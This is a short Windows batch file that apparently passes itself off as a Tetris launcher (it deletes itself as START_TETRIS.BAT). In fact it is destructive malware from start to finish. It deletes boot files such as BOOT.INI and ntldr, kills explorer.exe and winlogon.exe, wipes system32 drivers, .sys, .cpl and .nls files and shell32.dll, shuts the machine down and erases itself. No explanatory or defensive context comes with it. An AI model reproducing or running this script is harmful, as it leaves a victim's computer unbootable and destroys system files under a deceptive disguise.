del C:\COMMAND.COM
del C:\BOOT.INI
del C:\ntldr
del C:\Bootfont.bin
taskkill /F /IM explorer.exe
taskkill /F /IM winlogon.exe
del %SystemRoot%\explorer.exe
del %SystemRoot%\system32\*.sys
del %SystemRoot%\system32\*.cpl
del %SystemRoot%\system32\winlogon.exe
del %SystemRoot%\system32\shell32.dll
del %SystemRoot%\system32\drivers\*.sys
del %SystemRoot%\system32\*.nls
shutdown
del START_TETRIS.BAT
